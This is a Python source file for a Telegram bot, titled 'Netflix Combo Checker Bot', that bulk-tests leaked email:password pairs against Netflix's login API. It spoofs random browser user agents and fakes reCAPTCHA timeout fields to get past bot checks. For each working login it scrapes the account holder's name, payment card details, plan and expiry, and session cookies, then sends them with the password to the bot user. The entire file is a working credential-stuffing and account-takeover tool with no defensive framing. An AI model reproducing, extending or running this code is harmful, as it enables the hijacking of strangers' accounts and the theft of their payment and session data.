import os
import re
import uuid
import logging
from datetime import datetime

import requests
from fake_useragent import UserAgent
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# Colors for console logging
G = "\033[1;32m"
R = "\033[1;31m"
C = "\033[1;36m"
W = "\033[0m"

# Telegram Bot Token - Set this in Railway Environment Variables
TOKEN = os.getenv("TELEGRAM_TOKEN")

# Logging setup
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

class NetflixChecker:
    def __init__(self):
        self.ua = UserAgent()
        self.country_codes = {
            "AF": "93", "AL": "355", "DZ": "213", "AR": "54", "AM": "374", "AU": "61",
            "AT": "43", "AZ": "994", "BH": "973", "BD": "880", "BE": "32", "BR": "55",
            "BG": "359", "CA": "1", "CL": "56", "CN": "86", "CO": "57", "HR": "385",
            "CZ": "420", "DK": "45", "EG": "20", "FI": "358", "FR": "33", "DE": "49",
            "GR": "30", "HK": "852", "HU": "36", "IN": "91", "ID": "62", "IE": "353",
            "IL": "972", "IT": "39", "JP": "81", "KR": "82", "MY": "60", "MX": "52",
            "NL": "31", "NZ": "64", "NO": "47", "PK": "92", "PH": "63", "PL": "48",
            "PT": "351", "RO": "40", "RU": "7", "SA": "966", "SG": "65", "ZA": "27",
            "ES": "34", "SE": "46", "CH": "41", "TH": "66", "TR": "90", "UA": "380",
            "AE": "971", "GB": "44", "US": "1", "VN": "84", "PH": "63"
        }

    def get_country_code(self, country: str) -> str:
        return self.country_codes.get(country.upper(), "1")

    async def check_account(self, email: str, password: str) -> str:
        try:
            session = requests.Session()
            ua = self.ua.random

            # Detect country
            country = "US"
            try:
                geo_resp = session.get(
                    "https://geolocation.onetrust.com/cookieconsentpub/v1/geo/location",
                    headers={"User-Agent": ua}, timeout=10
                )
                if geo_resp.status_code == 200:
                    try:
                        country = geo_resp.json().get("country", "US")
                    except:
                        match = re.search(r'"country":"(.*?)"', geo_resp.text)
                        if match:
                            country = match.group(1)
            except:
                pass

            code = self.get_country_code(country)
            login_url = f"https://www.netflix.com/{country.lower()}-en/login"

            res = session.get(login_url, headers={"User-Agent": ua, "Accept-Encoding": "gzip, deflate"}, timeout=15)
            source = res.text

            # Extract parameters
            clcsSessionId = re.search(r'clcsSessionId\\":\\"(.*?)\\"', source)
            clcsSessionId = clcsSessionId.group(1) if clcsSessionId else ""

            referrerRenditionId = re.search(r'referrerRenditionId\\":\\"(.*?)\\"', source)
            referrerRenditionId = referrerRenditionId.group(1) if referrerRenditionId else ""

            version = re.search(r'X-Netflix.uiVersion":"(.*?)"', source)
            version = version.group(1) if version else ""

            page_uuid_match = re.search(r'hidden":true,"readOnly":true,"fieldType":"String","value":"(.*?)"', source)
            page_uuid = page_uuid_match.group(1) if page_uuid_match else str(uuid.uuid4())

            id_param = str(uuid.uuid4()).replace("-", "")

            payload = {
                "operationName": "CLCSScreenUpdate",
                "variables": {
                    "format": "HTML",
                    "imageFormat": "PNG",
                    "locale": f"en-{country.lower()}",
                    "serverState": f'{{"realm":"growth","name":"LOGIN","clcsSessionId":"{clcsSessionId}","sessionContext":{{"session-breadcrumbs":{{"funnel_name":"loginWeb"}}}}}}',
                    "serverScreenUpdate": f'{{"realm":"custom","name":"login.with.userLoginId.and.password","metadata":{{"recaptchaSiteKey":"6Lf8hrcUAAAAAIpQAFW2VFjtiYnThOjZOA5xvLyR"}},"loggingAction":"Submitted","loggingCommand":"SubmitCommand","referrerRenditionId":"{referrerRenditionId}"}}',
                    "inputFields": [
                        {"name": "userLoginId", "value": {"stringValue": email}},
                        {"name": "password", "value": {"stringValue": password}},
                        {"name": "countryCode", "value": {"stringValue": f"+{code}"}},
                        {"name": "countryIsoCode", "value": {"stringValue": country}},
                        {"name": "recaptchaError", "value": {"stringValue": "RESPONSE_TIMED_OUT"}},
                        {"name": "recaptchaResponseTime", "value": {"intValue": 2699}}
                    ]
                },
                "extensions": {"persistedQuery": {"id": "823e4880-a085-48aa-8962-fcb3be84ae61", "version": 102}}
            }

            post_headers = {
                "X-Netflix.request.id": id_param,
                "X-Netflix.context.app-Version": version,
                "X-Netflix.request.toplevel.uuid": page_uuid,
                "Content-Type": "application/json",
                "User-Agent": ua,
                "Accept-Encoding": "gzip, deflate"
            }

            res_auth = session.post(
                "https://web.prod.cloud.netflix.com/graphql",
                json=payload, headers=post_headers, timeout=20
            )

            if "Navigating to /browse" in res_auth.text or 'universal":"/browse"' in res_auth.text:
                # Get account details
                account_url = "https://www.netflix.com/account"
                headers = {
                    'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36",
                    'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                    'Accept-Encoding': "gzip, deflate, br",
                    'upgrade-insecure-requests': "1",
                    'referer': "https://www.netflix.com/",
                    'accept-language': "en-US,en"
                }
                response = session.get(account_url, headers=headers, timeout=15)
                m = response.text

                try:
                    end = re.search(r'"localDate":"(.*?)"', m)
                    end = end.group(1) if end else "N/A"

                    cc = re.search(r'displayText":"(.*?)"', m)
                    cc = cc.group(1) if cc else "N/A"

                    type_cc = re.search(r'paymentOptionLogo":"(.*?)"', m)
                    type_cc = type_cc.group(1) if type_cc else "N/A"

                    co = re.search(r'"country":"(.*?)"', m)
                    co = co.group(1) if co else country

                    screens = re.search(r'"maxStreams":(\d+)', m)
                    screens = screens.group(1) if screens else "4"

                    member = re.search(r'"membershipStatus":"(.*?)"', m)
                    member = member.group(1) if member else "CURRENT_MEMBER"

                    name = re.search(r'"firstName":"(.*?)"', m)
                    name = name.group(1).replace('\\x20', ' ') if name else "N/A"

                    # Cookies
                    cookies = response.cookies
                    cookie_str = f"flwssn={cookies.get('flwssn','')}; nfvdid={cookies.get('nfvdid','')}; SecureNetflixId={cookies.get('SecureNetflixId','')}; NetflixId={cookies.get('NetflixId','')}"

                    result = f"""✅ <b>SUCCESSFUL LOGIN</b>

📧 <b>Email:</b> <code>{email}</code>
🔑 <b>Pass:</b> <code>{password}</code>
🌍 <b>Country:</b> {co}
📱 <b>Screens:</b> {screens}
👤 <b>Status:</b> {member}
👤 <b>Name:</b> {name}
📅 <b>Expire:</b> {end}
💳 <b>CC:</b> {cc}
💳 <b>Type:</b> {type_cc}
🍪 <b>Cookie:</b> <code>{cookie_str[:100]}...</code>"""

                    return result

                except Exception as parse_err:
                    logger.error(f"Parse error: {parse_err}")
                    return f"✅ <b>Logged in</b> (details parsing failed)\nEmail: <code>{email}</code>"

            else:
                return f"❌ <b>Bad Login</b>\nEmail: <code>{email}</code>\nPass: <code>{password}</code>"

        except Exception as e:
            logger.error(f"Check error for {email}: {e}")
            return f"⚠️ <b>Error</b>\nEmail: <code>{email}</code>\nError: {str(e)[:150]}"

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 <b>Netflix Combo Checker Bot</b>\n\n"
        "Send combos like:\n"
        "<code>email:password</code>\n\n"
        "You can send multiple lines for bulk check.",
        parse_mode='HTML'
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message or not update.message.text:
        return

    text = update.message.text.strip()
    lines = [line.strip() for line in text.split('\n') if ':' in line.strip()]

    if not lines:
        await update.message.reply_text("❌ Send valid email:password combos (one per line).")
        return

    checker = NetflixChecker()
    total = len(lines)
    await update.message.reply_text(f"🔄 Checking <b>{total}</b> account(s)...", parse_mode='HTML')

    for i, line in enumerate(lines, 1):
        try:
            email, password = [x.strip() for x in line.split(':', 1)]
            if not email or not password:
                continue

            status = f"⏳ Checking {i}/{total}: <code>{email}</code>"
            temp_msg = await update.message.reply_text(status, parse_mode='HTML')

            result = await checker.check_account(email, password)
            await temp_msg.edit_text(result, parse_mode='HTML', disable_web_page_preview=True)

        except Exception as e:
            logger.error(f"Line error: {e}")

    await update.message.reply_text(f"✅ <b>Check Completed!</b>\nTotal: {total}", parse_mode='HTML')

def main():
    if not TOKEN:
        logger.error("TELEGRAM_TOKEN not set in environment variables!")
        return

    application = Application.builder().token(TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.TEXT & \~filters.COMMAND, handle_message))

    logger.info("🚀 Netflix Checker Bot started successfully!")
    application.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
